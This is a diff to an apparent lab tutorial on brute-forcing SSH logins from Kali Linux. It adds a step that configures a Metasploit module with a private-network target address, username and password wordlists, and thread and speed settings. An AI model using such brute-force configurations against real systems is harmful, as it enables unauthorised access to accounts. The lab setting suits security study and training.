@@ -72,5 +72,17 @@ nano /home/kali/ssh-brute/pass.txt
 #### content of the passwords file:
 ![image](https://github.com/user-attachments/assets/ce6f742d-8ca9-4f4c-9dda-ab4404fe97c8)
 
+### ✅ Step 5: Configure the Metasploit Module
 
+Now that the wordlists are ready, configure Metasploit with the correct options:
+
+```bash
+set RHOSTS 192.168.64.3
+set USER_FILE /home/kali/ssh-brute/users.txt
+set PASS_FILE /home/kali/ssh-brute/pass.txt
+set BRUTEFORCE_SPEED 5
+set THREADS 4
+set VERBOSE true
+```
+![image](https://github.com/user-attachments/assets/e37da72a-ba23-410a-b272-a7eb443162df)
 
